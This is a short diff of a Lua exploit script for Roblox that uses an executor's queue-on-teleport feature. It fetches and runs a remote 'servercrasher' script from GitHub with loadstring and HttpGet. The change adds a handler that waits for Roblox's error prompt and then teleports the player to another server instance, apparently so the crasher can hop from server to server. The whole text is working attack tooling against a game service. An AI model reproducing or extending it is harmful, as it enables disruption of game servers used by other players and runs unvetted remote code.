@@ -35,7 +35,8 @@ if syn.queue_on_teleport then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0nly6Ex/servercrasher/main/master.lua"))()
 
 
-    wait(80)
+ game.CoreGui.RobloxPromptGui.promptOverlay.Changed:Connect(function()
+    if game.CoreGui.RobloxPromptGui.promptOverlay:FindFirstChild("ErrorPrompt") and game.CoreGui.RobloxPromptGui.promptOverlay:FindFirstChild("ErrorPrompt"):FindFirstChild("MessageArea") then 
          if Decision == "any" then
                     game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, GUIDs[math.random(1,#GUIDs)].id, Player)
                 elseif Decision == "smallest" then
@@ -44,4 +45,6 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/0nly6Ex/servercrasher
                     game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, GUIDs[1].id, Player)
                 else
                     print("Broke")
-                end   
+                end    
+            end
+    end)
